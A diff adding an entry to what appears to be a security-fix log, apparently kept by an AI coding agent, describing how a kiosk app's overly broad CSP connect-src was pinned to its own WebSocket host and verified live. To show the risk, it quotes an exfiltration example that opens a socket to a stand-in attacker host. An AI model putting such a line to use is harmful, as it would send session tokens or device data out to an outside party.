@@ -3438,3 +3438,42 @@ to that constraint: they import only dependency-free modules (`hosts.js`,
   the exact message and threshold this commit added. No real enrollment code
   or device was touched; the probe used a fabricated code that never matched
   a row.
+
+- **[24/08/2026, Loop A] `connect-src` allowed a WebSocket to any host, not
+  just this app's own hub, on `zol`.** A different class of gap than the six
+  entries above, found reading `index.js`'s CSP block rather than `app.js`:
+  `connectSrc: ["'self'", 'ws:', 'wss:', PLATFORM_API]` uses bare scheme
+  sources for the socket, and a CSP scheme source matches *any* host on that
+  scheme — confirmed live, not assumed, by reading the actual response header
+  (`curl -sD- https://more30.com/kiosk/console.html`):
+  `connect-src 'self' ws: wss: https://uhnrgujbdxhhmoxcjria.supabase.co`.
+  `script-src` already carries `'unsafe-inline'` (the theme toggle and
+  password-reveal scripts in `console.html` need it), so the one thing
+  standing between a future injected script and exfiltrating a session token
+  or device fleet data was `connect-src` — and it was wide open:
+  `new WebSocket('wss://attacker.example')` was explicitly CSP-allowed.
+
+  `config.wsHost` is not a per-request value — it is a fixed hostname read
+  from `WS_HOST` once at boot (its own comment in `config.js` says every real
+  deployment sets it), and confirmed live at `GET /kiosk/api/config` →
+  `{"wsHost":"kiosk.more30.com"}`. So it can be pinned exactly:
+  `connectSrc: ["'self'", ...(config.wsHost ? [\`wss://${config.wsHost}\`,
+  \`ws://${config.wsHost}\`] : ['ws:', 'wss:']), PLATFORM_API]`. The
+  local/same-host fallback (`WS_HOST` unset — local dev, or a direct Railway
+  URL with no dedicated socket host) keeps the original broad scheme sources
+  unchanged, so nothing in that path can regress from this edit.
+
+  `node --check` clean. `node --test` in the `zol` checkout: `hosts.test.mjs`
+  7/7 (untouched — `index.js` isn't imported by it); `routing.test.mjs`/
+  `seedadmin.test.mjs` fail on the same pre-existing, unrelated gaps (no
+  `express`, no `node:sqlite` in this container's Node 20.20.2) every prior
+  entry in this log has hit — same baseline before and after. Pushed to
+  `l023131500-ops/zol`#`claude/what-do-you-see-gxo5tc` (`7c97454`).
+  **Confirmed live**: polled `https://more30.com/kiosk/console.html`'s
+  response header every 15s after the push; the third check still read the
+  pre-fix directive, the fourth read
+  `connect-src 'self' wss://kiosk.more30.com ws://kiosk.more30.com
+  https://uhnrgujbdxhhmoxcjria.supabase.co` — the exact host `/api/config`
+  reports and nothing broader. The console's own socket dials exactly that
+  host (`socketUrl()` in `app.js`), so the tightened policy still allows the
+  one connection the product needs and nothing else.
